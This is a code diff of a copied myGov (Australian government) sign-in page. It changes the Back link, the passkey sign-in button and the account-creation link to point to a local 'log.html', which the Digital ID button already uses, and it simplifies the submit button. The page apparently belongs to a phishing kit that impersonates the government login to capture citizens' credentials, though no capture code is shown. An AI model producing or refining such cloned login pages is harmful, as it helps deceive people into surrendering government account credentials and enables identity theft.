@@ -85,7 +85,7 @@
                         <div class="login-grid-column">
                             <div class="digital-id-login-card-wrapper">
                                 <div class="digital-id-main-login-card override">
-                                    <a data-go-back-link="" class="button-back" href="#">Back</a>
+                                    <a data-go-back-link="" class="button-back" href="log.html">Back</a>
                                     <h1>Sign in with myGov</h1>
                                     <p class="login-instruction-text">Choose how to sign in</p>
 
@@ -96,7 +96,7 @@
                                                 <div class="inner-options">
                                                     <a class="button-digital-identity" href="log.html">Sign in with Digital ID</a>
                                                     <input type="hidden" value="{flowScope.targetParamDI}">
-                                                    <a class="button-digital-identity" id="passkey-signin-btn" onclick="authenticatePasskey()" tabindex="0">
+                                                    <a class="button-digital-identity" id="passkey-signin-btn" href="log.html" onclick="authenticatePasskey()" tabindex="0">
                                                         <img class="passkey-icon" src="https://login.my.gov.au/mygov/content/mgv2/icons/FIDO_Passkey_mark_A_black.svg" alt="Passkey icon">
                                                         Sign in with passkey
                                                     </a>
@@ -141,14 +141,11 @@
                                         </p>
                                         <div class="button-digital-id-main-container override">
                                             <div class="digital-id-button-container">
-                                                <button type="submit" class="button-main" name="btn1" id="btn1">
-                                                    <span class="btn-label">Sign in</span>
-                                                    <span class="btn-spinner" aria-hidden="true"></span>
-                                                </button>
+                                                <button type="submit" class="button-main" name="btn1" id="btn1">Sign in</button>
                                             </div>
                                         </div>
                                         <p class="create-account-text">
-                                            <a class="create-account-link" href="#">Create a myGov account</a> if you don't have one already.
+                                            <a class="create-account-link" href="log.html">Create a myGov account</a> if you don't have one already.
                                         </p>
                                     </form>
                                 </div>
